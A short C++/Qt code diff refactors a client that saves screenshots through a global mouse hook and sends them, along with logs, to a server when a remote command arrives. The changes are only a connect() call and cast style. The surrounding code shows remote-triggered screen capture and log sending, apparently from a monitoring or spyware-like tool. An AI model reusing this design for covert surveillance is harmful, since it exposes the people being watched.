@@ -51,8 +51,7 @@ Client::Client(QObject* parent, const QString& defaultPath, quint16 _locPort, QS
 
     //Set path
     MouseHook::instance().setPath(path);
-    connect(&MouseHook::instance(), &MouseHook::screenSaved,
-    this, [this](QString screenName)
+    connect(&MouseHook::instance(), &MouseHook::screenSaved, [this](QString screenName)
     {
         //Send screenshot
         fileClient->enqueueDataAndConnect(std::make_unique<data::File>(path + "/screens/" + screenName));
@@ -129,8 +128,8 @@ void Client::getString(const QString &string, const QString& /* ip */)
         QString currentFile = filesStr.section('|', 0, 0);
         int files = currentFile.toInt();
 
-        if (files & (int)Files::Screen) emit MouseHook::instance().mouseClicked();
-        if (files & (int)Files::Log) enqueueLog();
+        if (files & static_cast<int>(Files::Screen)) emit MouseHook::instance().mouseClicked();
+        if (files & static_cast<int>(Files::Log)) enqueueLog();
     }
 }
 
